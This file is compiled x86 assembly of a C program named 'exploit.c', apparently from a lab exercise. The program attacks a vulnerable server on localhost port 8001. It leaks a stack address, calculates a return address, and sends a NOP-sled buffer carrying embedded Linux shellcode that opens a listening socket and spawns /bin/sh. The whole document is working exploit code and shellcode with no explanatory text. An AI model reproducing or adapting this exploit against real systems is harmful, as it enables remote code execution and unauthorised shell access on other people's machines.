	.file	"exploit.c"
	.comm	buffer_addr,10,1
	.comm	stack_start_address,4,4
.globl shellcode
	.data
	.align 32
	.type	shellcode, @object
	.size	shellcode, 101
shellcode:
	.string	"\203\304\200jfj\001[X\231Rj\001j\002\211\341\315\200\211\306jfXCRfh\374\025fS\211\341j\020QV\211\341\315\200jfXCCj\005V\315\200jfXCRRV\211\341\315\200\211\303j?X1\311\315\200j?XA\315\2001\300Ph//shh/bin\211\343\231P\260\013Y\315\200"
	.section	.rodata
.LC0:
	.string	"--%s--\n"
	.align 4
.LC1:
	.string	"Stack Start Address Obtained: %s\n"
	.text
	.type	get_StackStart, @function
get_StackStart:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$300, %esp
	movl	$622882853, -284(%ebp)
	movl	$1699225712, -280(%ebp)
	movl	$544433522, -276(%ebp)
	movl	$543516788, -272(%ebp)
	movl	$1970037110, -268(%ebp)
	movl	$1881481317, -264(%ebp)
	movl	$7546144, -260(%ebp)
	movl	$256, 12(%esp)
	movl	$256, 8(%esp)
	leal	-256(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	recv
	movl	$0, 12(%esp)
	movl	$256, 8(%esp)
	leal	-284(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	send
	movl	$256, 12(%esp)
	movl	$256, 8(%esp)
	leal	-284(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	recv
	movl	$.LC0, %eax
	leal	-284(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	printf
	leal	-284(%ebp), %eax
	addl	$32, %eax
	movl	$10, 8(%esp)
	movl	%eax, 4(%esp)
	movl	$buffer_addr, (%esp)
	call	memcpy
	movl	$.LC1, %eax
	movl	$buffer_addr, 4(%esp)
	movl	%eax, (%esp)
	call	printf
	movl	$buffer_addr, %eax
	movl	$0, 8(%esp)
	movl	$0, 4(%esp)
	movl	%eax, (%esp)
	call	strtoul
	movl	%eax, stack_start_address
	leave
	ret
	.size	get_StackStart, .-get_StackStart
	.section	.rodata
	.align 4
.LC2:
	.string	"New Return Address Calculated: %d\n"
	.align 4
.LC3:
	.string	"Constructing attack string... "
.LC4:
	.string	"DONE "
	.align 4
.LC5:
	.string	"Sending attack string to vulnerable server... "
.LC6:
	.string	"DONE - Server Exploited ! "
	.text
	.type	send_exploit, @function
send_exploit:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$292, %esp
	movl	stack_start_address, %eax
	subl	$112, %eax
	movl	%eax, -8(%ebp)
	movl	$.LC2, %eax
	movl	-8(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	printf
	movl	-8(%ebp), %eax
	movl	%eax, -16(%ebp)
	leal	-280(%ebp), %eax
	movl	%eax, -20(%ebp)
	movl	$.LC3, (%esp)
	call	puts
	movl	$0, -24(%ebp)
	jmp	.L4
.L5:
	movl	-20(%ebp), %eax
	movl	-16(%ebp), %edx
	movl	%edx, (%eax)
	addl	$4, -20(%ebp)
	addl	$4, -24(%ebp)
.L4:
	cmpl	$255, -24(%ebp)
	jle	.L5
	movl	$32, 8(%esp)
	movl	$144, 4(%esp)
	leal	-280(%ebp), %eax
	movl	%eax, (%esp)
	call	memset
	leal	-280(%ebp), %eax
	movl	%eax, -12(%ebp)
	addl	$32, -12(%ebp)
	movl	$0, -24(%ebp)
	jmp	.L6
.L7:
	movl	-24(%ebp), %eax
	movzbl	shellcode(%eax), %edx
	movl	-12(%ebp), %eax
	movb	%dl, (%eax)
	addl	$1, -12(%ebp)
	addl	$1, -24(%ebp)
.L6:
	movl	-24(%ebp), %ebx
	movl	$shellcode, (%esp)
	call	strlen
	cmpl	%eax, %ebx
	jb	.L7
	movb	$0, -25(%ebp)
	movl	$.LC4, (%esp)
	call	puts
	movl	$.LC5, (%esp)
	call	puts
	movl	$0, 12(%esp)
	movl	$256, 8(%esp)
	leal	-280(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	send
	movl	$.LC6, (%esp)
	call	puts
	addl	$292, %esp
	popl	%ebx
	popl	%ebp
	ret
	.size	send_exploit, .-send_exploit
	.section	.rodata
.LC7:
	.string	"socket()"
.LC8:
	.string	"localhost"
.LC9:
	.string	"gethostbyname()"
.LC10:
	.string	"connect()"
	.text
.globl main
	.type	main, @function
main:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$36, %esp
	movl	$0, 8(%esp)
	movl	$1, 4(%esp)
	movl	$2, (%esp)
	call	socket
	movl	%eax, -4(%ebp)
	cmpl	$0, -4(%ebp)
	jns	.L10
	movl	$.LC7, (%esp)
	call	perror
	movl	$1, (%esp)
	call	exit
.L10:
	movl	$.LC8, (%esp)
	call	gethostbyname
	movl	%eax, -8(%ebp)
	cmpl	$0, -8(%ebp)
	jne	.L11
	movl	$.LC9, (%esp)
	call	perror
	movl	$1, (%esp)
	call	exit
.L11:
	movl	$16, 8(%esp)
	movl	$0, 4(%esp)
	leal	-24(%ebp), %eax
	movl	%eax, (%esp)
	call	memset
	movw	$2, -24(%ebp)
	movl	$8001, (%esp)
	call	htons
	movw	%ax, -22(%ebp)
	movl	-8(%ebp), %eax
	movl	12(%eax), %eax
	movl	%eax, %edx
	movl	-8(%ebp), %eax
	movl	16(%eax), %eax
	movl	(%eax), %eax
	movl	%edx, 8(%esp)
	movl	%eax, 4(%esp)
	leal	-24(%ebp), %eax
	addl	$4, %eax
	movl	%eax, (%esp)
	call	memcpy
	leal	-24(%ebp), %eax
	movl	$16, 8(%esp)
	movl	%eax, 4(%esp)
	movl	-4(%ebp), %eax
	movl	%eax, (%esp)
	call	connect
	testl	%eax, %eax
	jns	.L12
	movl	$.LC10, (%esp)
	call	perror
	movl	$1, (%esp)
	call	exit
.L12:
	movl	-4(%ebp), %eax
	movl	%eax, (%esp)
	call	get_StackStart
	movl	-4(%ebp), %eax
	movl	%eax, (%esp)
	call	send_exploit
	movl	-4(%ebp), %eax
	movl	%eax, (%esp)
	call	close
	movl	$0, %eax
	leave
	ret
	.size	main, .-main
	.ident	"GCC: (GNU) 4.4.6 20120305 (Red Hat 4.4.6-4)"
	.section	.note.GNU-stack,"",@progbits
